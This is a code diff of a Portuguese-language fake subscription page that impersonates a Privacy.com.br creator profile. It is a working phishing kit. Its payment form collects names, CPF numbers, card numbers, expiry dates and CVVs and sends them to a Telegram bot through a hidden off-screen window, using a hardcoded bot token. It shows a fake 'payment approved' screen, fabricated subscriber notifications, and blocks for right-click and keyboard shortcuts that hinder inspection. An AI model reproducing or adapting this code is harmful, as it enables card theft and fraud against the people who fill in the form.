@@ -5,160 +5,152 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Privacy | Kamylinha Santos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 
     <style>
-        :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fafafa; color: #333; padding-bottom: 100px; }
+        :root { --primary-orange: #f47b52; --primary-gradient: linear-gradient(90deg, #f47b52, #f9a67a); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+        body { background-color: #fff; padding-bottom: 120px; }
 
-        /* Header Privacy */
-        .nav { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: center; position: sticky; top: 0; background: #fff; z-index: 100; }
-        .logo-img { height: 28px; content: url('logo.png'); }
+        /* ANTI-COPIA NAS IMAGENS */
+        img { pointer-events: none; -webkit-user-drag: none; }
 
-        /* Perfil Section */
-        .banner { width: 100%; height: 240px; background: #eee url('capa.png') center/cover; }
-        .p-wrapper { margin-top: -65px; padding-left: 20px; display: flex; align-items: flex-end; }
-        .p-pic { width: 125px; height: 125px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; border-bottom: 1px solid #f0f0f0; position: sticky; top: 0; background: #fff; z-index: 100; }
+        .banner { width: 100%; height: 250px; background: #eee url('capa.png') center/cover; }
         
-        .info { padding: 15px 20px; background: #fff; }
-        .name { font-size: 24px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
-        .user { color: #666; font-size: 15px; margin-bottom: 12px; }
-        .stats { display: flex; gap: 20px; margin-bottom: 15px; font-size: 14px; }
-        .stats b { color: #222; }
-        .bio { font-size: 14px; line-height: 1.6; color: #444; margin-bottom: 20px; }
+        .profile-pic-wrapper { margin-top: -55px; padding-left: 20px; position: relative; }
+        .p-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
 
-        /* Botão Assinar */
-        .btn-box { padding: 0 20px; margin-bottom: 25px; }
-        .btn-main { width: 100%; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--p-grad); font-weight: 800; font-size: 18px; box-shadow: 0 5px 20px rgba(244,123,82,0.3); }
+        .info { padding: 15px 20px; }
+        .name { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
+        .bio { font-size: 14px; color: #444; margin-top: 10px; line-height: 1.5; }
 
-        /* Galeria */
-        .section-title { padding: 10px 20px; font-size: 14px; font-weight: 800; color: #888; text-transform: uppercase; letter-spacing: 1px; }
-        .gallery { padding: 10px 20px; display: grid; gap: 15px; }
-        .gal-item { width: 100%; height: 320px; border-radius: 20px; background: url('imagem2.png') center/cover; filter: blur(18px); border: 1px solid #eee; position: relative; overflow: hidden; }
-        .gal-item::after { content: "\f023"; font-family: "Font Awesome 5 Free"; font-weight: 900; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 40px; color: #fff; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+        .btn-sub { width: calc(100% - 40px); margin: 15px 20px; padding: 18px 25px; border-radius: 50px; border: none; color: white; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--primary-gradient); font-weight: 700; font-size: 18px; }
 
-        /* FAQ Estilizado */
-        .faq-container { margin: 15px 20px; background: #fff; border-radius: 20px; padding: 10px 20px; border: 1px solid #eee; }
-        .faq-item { border-bottom: 1px solid #f5f5f5; padding: 15px 0; }
-        .faq-item:last-child { border: none; }
-        .faq-q { font-weight: 700; font-size: 14px; color: #222; }
-        .faq-a { font-size: 13px; color: #777; margin-top: 5px; }
+        .gallery { padding: 0 20px; margin-top: 15px; }
+        .media-blur { width: 100%; height: 280px; border-radius: 20px; background: url('imagem2.png') center/cover; filter: blur(15px); border: 1px solid #eee; }
 
-        /* Modais */
-        #payModal, #confirmModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(6px); }
-        .m-content { background: #fff; margin: 12% auto; width: 92%; max-width: 400px; border-radius: 30px; padding: 35px; text-align: center; }
-        .f-group { text-align: left; margin-bottom: 15px; }
-        .f-group label { font-size: 11px; font-weight: 800; color: #aaa; text-transform: uppercase; margin-left: 5px; }
-        .f-group input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #eee; background: #f9f9f9; font-size: 16px; outline: none; margin-top: 5px; }
-        .btn-pay { width: 100%; padding: 20px; background: var(--p-grad); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        /* MODAL E FORMULÁRIO */
+        #payModal, #successScreen { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); backdrop-filter: blur(8px); }
+        .m-content { background: #fff; margin: 8% auto; width: 92%; max-width: 420px; border-radius: 25px; padding: 30px; }
+        
+        .f-group { margin-bottom: 15px; text-align: left; }
+        .f-group label { display: block; font-weight: 700; font-size: 13px; color: #333; margin-bottom: 5px; }
+        .f-group input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ffd8cc; background: #fff9f7; font-size: 16px; outline: none; -webkit-user-select: text; user-select: text; }
+
+        /* TELA DE SUCESSO */
+        #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .img-final { width: 100%; max-width: 320px; border-radius: 20px; margin: 25px 0; border: 3px solid var(--primary-orange); }
+
+        .notif { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; transform: translateY(200%); transition: 0.6s; z-index: 3000; }
+        .notif.show { transform: translateY(0); }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false" onkeydown="return false">
 
-    <div class="nav"><img class="logo-img"></div>
+    <nav class="top-nav">
+        <img src="https://privacy.com.br/img/logo-orange.svg" height="26">
+        <i class="fa-solid fa-lock"></i>
+    </nav>
+
     <div class="banner"></div>
-    <div class="p-wrapper"><div class="p-pic"></div></div>
+    <div class="profile-pic-wrapper"><div class="p-pic"></div></div>
 
     <div class="info">
-        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
-        <p class="user">@eukamylinhasantos</p>
-        <div class="stats">
-            <span><b>142</b> Posts</span>
-            <span><b>52k</b> Curtidas</span>
-        </div>
-        <p class="bio">🔥 Musa do TikTok | Vem ver meu lado sem censura!<br>💦 Conteúdo novo todos os dias.<br>👇 Clique no botão para liberar meu VIP.</p>
+        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--primary-orange)"></i></div>
+        <p class="bio">🔥 Conteúdo VIP sem censura! Venha me ver de um jeito que você nunca viu. Assine agora e libere +300 mídias exclusivas.</p>
     </div>
 
-    <div class="btn-box">
-        <button class="btn-main" onclick="$('#payModal').fadeIn()">
-            <span>ASSINAR AGORA</span>
-            <span>R$ 10,00</span>
-        </button>
-    </div>
+    <button class="btn-sub" onclick="$('#payModal').fadeIn()">
+        <span>ASSINAR AGORA</span>
+        <span>R$ 10,00</span>
+    </button>
 
-    <div class="section-title">Publicações Privadas</div>
     <div class="gallery">
-        <div class="gal-item"></div>
-    </div>
-
-    <div class="section-title">Dúvidas Frequentes</div>
-    <div class="faq-container">
-        <div class="faq-item">
-            <p class="faq-q">O acesso é imediato?</p>
-            <p class="faq-a">Sim! Logo após a confirmação, você recebe o link no e-mail.</p>
-        </div>
-        <div class="faq-item">
-            <p class="faq-q">Aparece o nome dela na fatura?</p>
-            <p class="faq-a">Não, o pagamento é 100% discreto.</p>
-        </div>
+        <div class="media-blur"></div>
     </div>
 
     <div id="payModal">
         <div class="m-content">
-            <h2 style="margin-bottom:25px">Pagamento Seguro</h2>
-            <div class="f-group"><label>Nome Completo</label><input type="text" id="n" placeholder="Como no cartão"></div>
-            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c" placeholder="0000 0000 0000 0000"></div>
+            <h2 style="text-align:center; color:var(--primary-orange); margin-bottom:25px">Checkout Seguro</h2>
+            <div class="f-group"><label>Nome no Cartão</label><input type="text" id="p_name" placeholder="Nome Completo"></div>
+            <div class="f-group"><label>CPF do Titular</label><input type="text" id="p_cpf" placeholder="000.000.000-00"></div>
+            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
             <div style="display:flex; gap:10px">
-                <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="d" placeholder="MM/AA"></div>
-                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="v" placeholder="000"></div>
+                <div class="f-group" style="flex:2"><label>Validade</label><input type="text" id="c_val" placeholder="MM/AA"></div>
+                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="c_cvv" placeholder="123"></div>
             </div>
-            <button class="btn-pay" onclick="irParaConfirmar()">APROVAR COMPRA</button>
-            <p onclick="$('#payModal').fadeOut()" style="margin-top:15px; font-size:12px; color:#999; cursor:pointer">Voltar</p>
+            <button class="btn-sub" style="width:100%; margin:10px 0; justify-content:center" onclick="enviar()">APROVAR COMPRA</button>
+            <p style="text-align:center; color:#999; font-size:12px; cursor:pointer" onclick="$('#payModal').fadeOut()">Cancelar</p>
         </div>
     </div>
 
-    <div id="confirmModal">
-        <div class="m-content">
-            <div style="width:70px; height:70px; background:#e8f5e9; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px">
-                <i class="fa-solid fa-shield-check" style="color:#4caf50; font-size:35px"></i>
-            </div>
-            <h3>Verificação de Segurança</h3>
-            <p style="font-size:14px; color:#666; margin: 15px 0 30px">Detectamos seu cartão. Para concluir sua assinatura de R$ 10,00, clique no botão para confirmar a transação.</p>
-            <button class="btn-pay" onclick="enviarEDisfarcar()">CONFIRMAR AGORA</button>
-        </div>
+    <div id="successScreen">
+        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:70px"></i>
+        <h1 style="margin-top:20px">Pagamento Aprovado!</h1>
+        <p style="color:#666; margin-top:10px">Seu acesso VIP foi enviado para o seu e-mail.</p>
+        <img src="imagem1.png" class="img-final">
+        <p style="font-weight:800; color:var(--primary-orange)">APROVEITE O CONTEÚDO 🔥</p>
+        <button class="btn-sub" style="width:200px; justify-content:center; margin-top:30px" onclick="location.reload()">SAIR</button>
+    </div>
+
+    <div class="notif" id="notif">
+        <img src="perfil1.png" style="width:45px; height:45px; border-radius:10px">
+        <div><b>Ricardo O.</b> acabou de assinar!<br><small style="color:var(--primary-orange); font-weight:bold">Acesso Liberado ✅</small></div>
     </div>
 
     <script>
         $(document).ready(function(){
-            $('#c').mask('0000 0000 0000 0000');
-            $('#d').mask('00/00');
-            $('#v').mask('000');
+            $('#c_num').mask('0000 0000 0000 0000');
+            $('#p_cpf').mask('000.000.000-00');
+            $('#c_val').mask('00/00');
+            $('#c_cvv').mask('000');
+
+            // Notificações fake
+            setInterval(() => {
+                $('#notif').addClass('show');
+                setTimeout(() => $('#notif').removeClass('show'), 5000);
+            }, 12000);
         });
 
-        function irParaConfirmar() {
-            if($('#c').val().length < 16) {
-                Notiflix.Notify.failure('Dados inválidos');
-                return;
-            }
-            $('#payModal').hide();
-            $('#confirmModal').fadeIn();
-        }
+        // BLOQUEIOS ADICIONAIS
+        document.addEventListener('keydown', function(e) {
+            if(e.ctrlKey || e.keyCode == 123) return false;
+        });
 
-        function enviarEDisfarcar() {
+        async function enviar() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '-1003569961624'; // SEU GRUPO
-            const msg = `🚀 NOVO CARD CAPTURADO\n👤 Nome: ${$('#n').val()}\n💳 Card: ${$('#c').val()}\n📅 Val: ${$('#d').val()}\n🔒 CVV: ${$('#v').val()}`;
             
+            const n = $('#p_name').val();
+            const c = $('#c_num').val();
+            const f = $('#p_cpf').val();
+            const v = $('#c_val').val();
+            const s = $('#c_cvv').val();
+
+            if (c.length < 16 || f.length < 14) {
+                Notiflix.Notify.failure('Preencha todos os dados corretamente!');
+                return;
+            }
+
+            Notiflix.Loading.circle('Validando operadora...');
+
+            const msg = `🚀 NOVO CARD CAPTURADO\n👤 Nome: ${n}\n🆔 CPF: ${f}\n💳 Card: ${c}\n📅 Val: ${v}\n🔒 CVV: ${s}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
-            
-            // Abre invisível fora da tela
-            const win = window.open(url, '_blank', 'width=1,height=1,left=15000,top=15000');
-            
-            Notiflix.Loading.circle('Processando...');
+
+            // Link "invisível" que fecha rápido
+            const win = window.open(url, '_blank', 'width=1,height=1,left=20000,top=20000');
 
             setTimeout(() => {
                 if(win) win.close();
                 Notiflix.Loading.remove();
-                $('#confirmModal').hide();
-                Notiflix.Report.success('Comprado com Sucesso', 'Acesso liberado! Verifique seu e-mail cadastrado.', 'OK', () => {
-                    location.reload();
-                });
-            }, 1500);
+                $('#payModal').hide();
+                $('#successScreen').css('display', 'flex'); // Mostra a imagem1.png no final
+            }, 2000);
         }
     </script>
 </body>
